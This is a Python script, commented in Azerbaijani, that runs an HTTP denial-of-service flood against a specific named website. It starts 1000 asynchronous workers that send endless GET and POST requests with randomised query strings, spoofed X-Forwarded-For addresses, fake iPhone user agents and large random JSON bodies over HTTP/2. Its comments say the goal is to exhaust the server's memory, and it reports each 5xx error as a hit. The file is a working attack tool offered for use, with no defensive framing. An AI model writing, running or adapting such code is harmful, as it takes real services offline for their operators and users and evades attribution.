import asyncio
import httpx
import random
import string
import time

TARGET_URL = "https://www.appl88-vip.com/"
# Asinxron limitlər (Railway üçün ideal güc)
WORKERS = 1000 

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def blast_worker(worker_id, client):
    while True:
        try:
            # Serveri yoran mürəkkəb URL parametrləri
            url = f"{TARGET_URL}?v={time.time()}&invite_code={random.randint(1000, 9999)}&ttclid=E_C_P_{r_str(50)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive"
            }

            # Serverin RAM-ını dərhal kilitləyən böyük JSON yükü
            payload = {r_str(10): r_str(2000) for _ in range(10)}

            # HTTP/2 Multiplexing - Eyni anda minlərlə yarımçıq paket
            responses = await asyncio.gather(*[
                client.post(url, headers=headers, json=payload, timeout=15),
                client.get(url, headers=headers, timeout=15)
            ], return_exceptions=True)
            
            # Əgər 5xx xətası gəlirse, deməli zərbə endirilir
            for r in responses:
                if hasattr(r, 'status_code') and r.status_code >= 500:
                    print(f"☢️  BUM! Server Error {r.status_code}", end="\r")

        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"🔥 TOTAL GIGA-BLAST INITIALIZED ON: {TARGET_URL}")
    print("[*] Switching to Asynchronous Power - No Thread Limits.")
    
    limits = httpx.Limits(max_connections=WORKERS, max_keepalive_connections=WORKERS)
    
    async with httpx.AsyncClient(
        http2=True, 
        verify=False, 
        limits=limits,
        timeout=None # Server donanda bağlantını buraxma (Slowloris)
    ) as client:
        
        workers = [blast_worker(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
